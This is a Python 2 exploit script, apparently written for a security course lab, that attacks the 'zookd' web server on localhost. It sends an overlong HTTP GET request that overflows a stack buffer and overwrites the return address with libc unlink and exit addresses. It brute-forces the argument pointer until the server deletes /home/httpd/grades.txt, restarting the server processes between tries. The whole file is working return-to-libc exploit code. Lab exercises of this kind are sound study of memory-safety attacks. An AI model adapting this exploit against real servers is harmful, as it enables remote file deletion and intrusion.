#!/usr/bin/python
import socket, struct, time, os, subprocess, urllib

RET_URI_OFF = 1024 - 15 + 16
UNLINK = 0x40a563b0
EXIT = 0x4098a520  # exit in libc+offset, approximate

def try_ptr(ptr):
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.5)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    body = "/../grades.txt"
    pad = (RET_URI_OFF - 1) - len(body)
    uri = "/" + body + "A" * pad
    uri += struct.pack("<I", UNLINK & 0xffffffff)
    uri += struct.pack("<I", EXIT & 0xffffffff)
    uri += struct.pack("<I", ptr & 0xffffffff)
    req = "GET " + uri + " HTTP/1.0\r\n\r\n"
    s = socket.socket()
    s.connect(("localhost", 8080))
    s.send(req)
    s.close()
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    return ok

os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
for lo in xrange(0xc800, 0xe000, 0x10):
    ptr = 0xffff0000 + lo
    if try_ptr(ptr):
        print("SUCCESS", hex(ptr))
        break
else:
    print("FAILED")
